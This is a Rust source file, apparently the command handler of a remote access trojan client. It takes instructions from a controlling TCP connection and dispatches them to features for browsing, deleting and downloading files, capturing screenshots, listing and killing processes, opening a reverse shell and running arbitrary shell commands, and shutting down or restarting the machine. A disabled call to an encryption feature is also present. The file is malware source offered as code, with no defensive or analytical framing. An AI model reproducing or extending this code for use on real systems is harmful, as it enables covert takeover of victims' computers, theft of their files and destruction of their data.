use std::sync::{Arc, Mutex};
use std::net::TcpStream;
use std::path::PathBuf;
use std::process::Child;

use crate::features::reverse_shell::{start_shell, exit_shell, execute_shell_command};
use crate::features::file_manager::file_manager;
use crate::features::system_commands::system_commands;
use crate::features::other::{take_screenshot, client_info};
use crate::features::process::{process_list, kill_process};
use crate::features::encryption::encryption_request;

pub fn handle_command(write_stream: &mut TcpStream, command: &str, remote_shell: &mut Option<Child>, current_path: &mut PathBuf) {
    match command {
        cmd 
        if cmd.starts_with("view_dir||") || cmd.starts_with("remove_dir||") || cmd.starts_with("remove_file||") || cmd.starts_with("download_file||") => {
            file_manager(write_stream, current_path, cmd);
        },
        "available_disks" | "previous_dir" => {
            file_manager(write_stream, current_path, command);
        },
        // _ if command.starts_with("encryption_request") => encryption_request(write_stream, &command["encryption_request::".len()..]),
        "init_client" => client_info(write_stream),
        _ if command.starts_with("take_screenshot") => {
            let display = command["take_screenshot::".len()..].parse::<i32>().unwrap();
            take_screenshot(write_stream, display);
        },
        "process_list" => process_list(write_stream),
        _ if command.starts_with("kill_process") => {
            let pid = command["kill_process::".len()..].parse::<usize>().unwrap();
            kill_process(pid);
        },
        "start_shell" => {
            let shared_stream = Arc::new(Mutex::new(write_stream.try_clone().expect("Failed to clone TcpStream")));
            start_shell(shared_stream, remote_shell)
        },
        "exit_shell" => exit_shell(remote_shell),
        _ if command.starts_with("shell::") => execute_shell_command(remote_shell, &command["shell::".len()..]),
        "shutdown" | "logout" | "restart" => system_commands(command),
        _ => {}
    }
}